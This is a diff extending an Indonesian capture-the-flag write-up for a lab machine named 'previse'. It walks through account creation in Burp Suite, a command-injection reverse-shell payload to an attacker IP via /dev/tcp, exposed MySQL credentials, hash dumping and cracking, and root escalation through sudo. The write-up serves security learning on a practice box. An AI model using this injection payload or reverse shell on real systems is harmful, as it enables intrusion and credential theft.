@@ -30,4 +30,63 @@ Lalu saya mencoba lagi menggunakan sql injection sederhana (sapa tau bisa yakan 
 
 ### Burp Suite
 ---
-Menggunakan aplkasi ini saya bisa
+Saya menghidupkan proxy server dan menggunakan burpsuite dan mengaktifkan mode instercept
+![burp](assets/burp1.png)
+Lalu saya kirim ke repeater dan mengganti request seperti yang ada di gambar dan akun telah terbuat XD
+![burp](assets/burp2.png)
+
+### Eksekusi
+---
+Setelah melewati gerbang pertama (login page) saya menemukan sesuatu yang menarik 
+![eksekusi](assets/exec1.png)
+Saya mendapat kedua file tersebut dari website dan dari sini maka diketahui m4lwhere adalah pemilik.
+Setelah itu saya melihat isi dari folder sitebackup dan menemukan seperti gambar dibawah
+![eksekusi](assets/exec2.png)
+Di sana saya menemukan exec() function yang mungkin bisa digguakan untuk rce dan mysql server
+```
+User root
+Password mySQL_p@ssw0rd!:)
+Database previse
+```
+>exec() dan eval() merupakan ide yang buruk dalam keamanan
+
+Lalu saya mencoba mengakses logs.php lalu di intercept menggunakan burpsuite dan mengirimkan ke repeater
+![eksekusi](assets/exec3.png)
+Lalu saya melakukan listen pada port 87 menngunakan payload ini untuk melakukan reverse shell
+```
+delim=comma%26/bin/bash+-c+'bash+-i+>+/dev/tcp/10.10.14.176/87+0>%261'
+```
+![eksekusi](assets/exec4.png)
+Lalu saya menggunakan payload berikut agar ~~banyak uang~~ (ada symbol $) dan masuk ke mysql server menggunakan username dan password yang tadi 
+```python
+python -c ‘import pty;pty.spawn(“/bin/bash”)’
+```
+![eksekusi](assets/exec5.png)
+Mantap jiwaaa saya bisa masuk ke mysql server, lalu saya akan mencuri password user m4lwhere
+```sql
+Select * from accounts;
+```
+![eksekusi](assets/exec6.png)
+Setelah saya mendapat hash passwordnya saya langsung mendecrypt menggunakan ~~john lennon~~ (eh maksud saya john the ripper)
+![eksekusi](assets/exec7.png)
+
+Dayummm! Saya mendapatkan passwordnya, saya menghabiskan waktu sangat lama untuk mendapatkan passwordnya :’)
+
+Setelah mendapatkan password karena port 22 terbuka saya mencoba untuk connect ke SSH
+![eksekusi](assets/exec8.png)
+Di sini saya mendapatkan flag pertama (**user.txt**), Yeayyyy
+![eksekusi](assets/exec9.png)
+
+### Privilege Escalation
+---
+Setelah itu saya menggunakan sudo -l untuk mengetahui pirintah sudo digunakan oleh siapa dan melihat isi file tersebut
+![sudo](assets/pe.png)
+Setelah itu saya mencoba mereverse shell root ke kali linux saya
+![sudo](assets/pe2.png)
+Dan saya pun mendapat flag root.txt
+![sudo](assets/pe3.png)
+
+# Terimaksih sudah membaca :)
+semangat belajarnya bro :')
+
+![gif](https://c.tenor.com/y2JXkY1pXkwAAAAC/cat-computer.gif)
